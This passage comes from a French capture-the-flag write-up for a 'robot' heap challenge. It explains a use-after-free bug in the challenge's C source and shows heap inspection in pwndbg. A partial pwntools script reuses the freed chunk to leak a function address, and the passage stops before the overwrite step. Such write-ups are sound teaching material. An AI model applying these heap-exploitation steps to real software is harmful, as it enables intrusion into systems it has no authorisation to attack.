</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">3</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Bip !&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">usleep</span> (<span style="color:#ae81ff">500000</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;La discussion avec %s est un peu ennuyeuse...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, d<span style="color:#f92672">-&gt;</span>name);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">roll</span>(<span style="color:#66d9ef">struct</span> Robot <span style="color:#f92672">*</span>d)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;%s se déplace en grinçant !</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, d<span style="color:#f92672">-&gt;</span>name);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">newRobot</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Vous construisez un nouveau robot. %s est un très joli nom pour un robot !</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> Robot <span style="color:#f92672">*</span>newrobot <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span> (<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Robot));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strncpy</span> (newrobot<span style="color:#f92672">-&gt;</span>name, s, <span style="color:#ae81ff">15</span>);
</span></span><span style="display:flex;"><span>    newrobot<span style="color:#f92672">-&gt;</span>makeNoise <span style="color:#f92672">=</span> bleep;
</span></span><span style="display:flex;"><span>    newrobot<span style="color:#f92672">-&gt;</span>move <span style="color:#f92672">=</span> roll;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>) newrobot;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">admin</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pwd)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> hash[SHA256_DIGEST_LENGTH];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>    result[<span style="color:#ae81ff">65</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SHA256</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) pwd, <span style="color:#a6e22e">strlen</span>(pwd), hash);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SHA256_DIGEST_LENGTH; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sprintf</span>(result <span style="color:#f92672">+</span> (i <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>), <span style="color:#e6db74">&#34;%02x&#34;</span>, hash[i]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(result, encrypted) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/bin/cat&#34;</span>, <span style="color:#e6db74">&#34;/bin/cat&#34;</span>, <span style="color:#e6db74">&#34;flag.txt&#34;</span>, NULL);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;execl&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;ERROR: wrong password!&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> Robot  <span style="color:#f92672">*</span>robot <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> RobotUserGuide <span style="color:#f92672">*</span>userGuide <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> ordre <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">64</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Install challenge timeout
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">signal</span>(SIGALRM, timeout);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alarm</span>(TIMEOUT);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Menu */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Que faites-vous ?&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;1: Construire un robot</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">4: Rédiger le mode d&#39;emploi&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;2: Le faire parler</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">5: Afficher le mode d&#39;emploi&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;3: Jouer avec le robot</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">6: Admin&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;0: Quitter&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Ordre */</span>
</span></span><span style="display:flex;"><span>        ordre <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>) <span style="color:#a6e22e">getc</span> (stdin);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ordre <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">getc</span> (stdin); <span style="color:#75715e">/* Enlève \n */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Exécution de l&#39;ordre */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (ordre) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Comment vous l&#39;appelez ?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fgets</span> (input, <span style="color:#ae81ff">64</span>, stdin);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (input[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
</span></span><span style="display:flex;"><span>                        input[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                robot <span style="color:#f92672">=</span> <span style="color:#a6e22e">newRobot</span>(input);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;2&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (robot)
</span></span><span style="display:flex;"><span>                    robot<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">makeNoise</span>(robot);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Vous n&#39;avez pas de robot !&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;3&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (robot) {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Vous allumez le robot. &#34;</span>);
</span></span><span style="display:flex;"><span>                    robot<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">move</span>(robot);
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;De la fumée commence à apparaître, puis des étincelles... %s prend feu !!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, robot<span style="color:#f92672">-&gt;</span>name);
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;%s est complètement détruit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, robot<span style="color:#f92672">-&gt;</span>name);
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">free</span> (robot);
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Vous n&#39;avez pas de robot !&#34;</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;4&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                userGuide <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span> (<span style="color:#66d9ef">sizeof</span> (<span style="color:#66d9ef">struct</span> RobotUserGuide));
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Vous commencez à rédiger le mode d&#39;emploi...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fgets</span> (userGuide<span style="color:#f92672">-&gt;</span>guide, <span style="color:#ae81ff">32</span>, stdin);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;5&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (userGuide) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> userGuide<span style="color:#f92672">-&gt;</span>guide[i];
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">putchar</span> (c);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">fflush</span> (stdout);
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Il n&#39;y a pas de mode d&#39;emploi&#34;</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;6&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Enter admin password</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fgets</span> (input, <span style="color:#ae81ff">64</span>, stdin);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (input[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
</span></span><span style="display:flex;"><span>                        input[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">admin</span> (input);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Au revoir !&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">exit</span> (<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Commande non reconnue&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">putchar</span> (<span style="color:#e6db74">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>On va commencer par regarder les deux <em>Struct</em>, on a donc une <em>Struct</em> &ldquo;Robot&rdquo; qui contient une variable <em>name</em> de <strong>16 chars</strong>, et deux fonctions <code>makeNoise</code> et <code>move</code>.</p>
<p>On a ensuite &ldquo;RobotUserGuide&rdquo; qui ne contient qu&rsquo;une variable <em>guide</em> de <strong>32 chars</strong>.</p>
<p>Globalement, les hypothèses sur les actions des options étaient bonnes, à un petit détail près: la vulnérabilité se situe dans l&rsquo;une d&rsquo;entre elle, plus précisément <strong>l&rsquo;option 3</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;3&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (robot) {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Vous allumez le robot. &#34;</span>);
</span></span><span style="display:flex;"><span>                    robot<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">move</span>(robot);
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;De la fumée commence à apparaître, puis des étincelles... %s prend feu !!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, robot<span style="color:#f92672">-&gt;</span>name);
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;%s est complètement détruit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, robot<span style="color:#f92672">-&gt;</span>name);
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">free</span> (robot);
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Vous n&#39;avez pas de robot !&#34;</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span></code></pre></div><p>On voit qu&rsquo;elle va <em>print</em> du texte (plus ou moins inutile), appeller la fonction <code>move</code> de la struct &ldquo;Robot&rdquo;, en ensuite <strong>free le chunk</strong>. On remarque qu&rsquo;il ne supprime pas le <em>pointeur</em>, une fois que le robot est &ldquo;cassé&rdquo;, il existe toujours un pointeur vers le chunk qui a été <em>free()</em> et le contenu du chunk sera toujours existant.</p>
<p>C&rsquo;est ici un cas assez classique de <strong>Use-After-Free</strong> (UAF). Il faut maintenant trouver un moyen de leak des valeurs de la <em>heap</em>.</p>
<p>On peut commencer par regarder le chunk dans <code>pwndbg</code>. On lance le programme puis on crée un robot avec n&rsquo;importe quel nom:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/235506542-72f6ef85-da08-4b99-aa76-c5f759805dd4.png" alt="2023-05-01-193724_830x462_scrot"></p>
<p>Maintenant, on fait <strong>CTRL+C</strong> pour interrompre le programme et pouvoir inspecter la <strong>heap</strong>. On va utiliser la commande <em>vis</em> et chercher notre chunk.</p>
<p><img src="https://user-images.githubusercontent.com/77807503/235506564-9c19d43e-f9fb-4c77-b9e5-40dc36fcb91e.png" alt="2023-05-01-193807_1069x1036_scrot"></p>
<p>Juste avant le <em>Top chunk</em>, on voit notre <em>Robot</em>, qu&rsquo;on reconnaît graĉe au &ldquo;ChatGPT&rdquo; (le nom donné au robot). On peut donc aussi voir que le chunk ne contient pas seulement le nom du robot, deux autres adresses s&rsquo;y trouvent - on va voir à quoi elles correspondent.</p>
<p><img src="https://user-images.githubusercontent.com/77807503/235506579-0b63fc28-4acd-424c-b3dd-eb183e7b732c.png" alt="2023-05-01-193935_1082x180_scrot"></p>
<p>Il s&rsquo;agit des deux fonctions de la <em>Struct</em> ajoutées au moment où on crée notre Robot. Ce sont ces adresses que nous voulont <em>leak</em>.</p>
<p>Pour le faire, les options <strong>4</strong> et <strong>5</strong> vont nous être utiles. L&rsquo;option <strong>4</strong> nous permet de <em>malloc</em> un chunk d&rsquo;une taille de <strong>32</strong>, et puisque nous savons que nous avons un <strong>Use-After-Free</strong>, ce chunk prendra la place dans l&rsquo;ancien chunk <em>Robot</em> si le robot est détruit avant la création du manuel. Enfin, on pourra lire le manuel avec l&rsquo;option <strong>5</strong>, et puisque cette option lit <em>32 chars</em>, elle va aussi lire les deux adresses qui étaient présentes après le nom du robot.</p>
<h3 id="tldr-leak">TLDR: Leak</h3>
<ol>
<li>Créer un robot (<em>malloc</em>)</li>
<li>Jouer avec le robot (<em>free</em>)</li>
<li>Créer un manuel (<em>malloc</em>)</li>
<li>Lire le manuel (<em>UAF</em>)</li>
</ol>
<p>Avec ça, on aura donc les adresses des fonctions <em>bleep</em> et <em>roll</em>. Commençons notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./robot&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;challenges.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#ae81ff">2101</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">construire</span>(name):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;construire(&#34;</span><span style="color:#f92672">+</span>str(name)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(name)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parler</span>():
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;parler()&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">supprimer</span>():
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;supprimer()&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mode_emploi</span>(text):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;mode_emploi(&#34;</span><span style="color:#f92672">+</span>str(text)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">manuel</span>():
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;manuel()&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> r
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    construire(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    supprimer()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    mode_emploi(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> manuel()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    roll <span style="color:#f92672">=</span> u64(leak[leak<span style="color:#f92672">.</span>index(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfc</span><span style="color:#e6db74">&#39;</span>):]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;roll @&#34;</span>, hex(roll))
</span></span></code></pre></div><p>On commence par créer quelques fonctions qui nous facilitent la communication avec l&rsquo;executable, puis on récupère le leak dans une variable. On peut vérifier le bon fonctionnement du script avec <code>pwndbg</code>:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/235506603-b7a42176-5182-4dca-96a5-725d28c91942.png" alt="2023-05-01-195650_1363x191_scrot"></p>
<p>Le script crée un robot avec un nom de <strong>16</strong> chars, le détruit, puis crée un mode d&rsquo;emploi de <strong>16</strong> chars (pour ne pas réecrire les adresses des variables), et lis le manuel pour avoir les <em>leaks</em>. On voit que l&rsquo;adresse affichée est bien celle de la fonction <em>roll</em>.</p>
<p>En faisant cette fonction, on comprend quelle est la deuxième partie de l&rsquo;exploit: réecrire la valeur d&rsquo;une fonction pour l&rsquo;appeller et obtenir le flag. Mais alors, quelle fonction <strong>de la struct</strong> réecrire, et par quoi?</p>
